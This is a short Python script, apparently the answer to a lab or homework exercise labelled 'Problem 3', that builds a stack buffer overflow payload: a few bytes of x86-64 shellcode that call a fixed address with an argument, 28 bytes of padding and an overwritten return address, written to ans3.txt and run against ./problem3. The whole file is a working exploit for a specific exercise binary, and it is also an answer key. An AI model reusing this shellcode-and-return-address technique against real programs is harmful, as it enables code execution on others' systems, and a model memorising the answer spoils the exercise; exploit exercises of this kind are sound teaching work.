import struct

shellcode = b'\xbf\x72\x00\x00\x00' + \
            b'\xb8\x16\x12\x40\x00' + \
            b'\xff\xd0'
padding = b'A' * 28
jmp_xs_addr = struct.pack('<Q', 0x401334)
payload = shellcode + padding + jmp_xs_addr

with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload for Problem 3 created! Size: {len(payload)} bytes.")
print("Run: ./problem3 ans3.txt")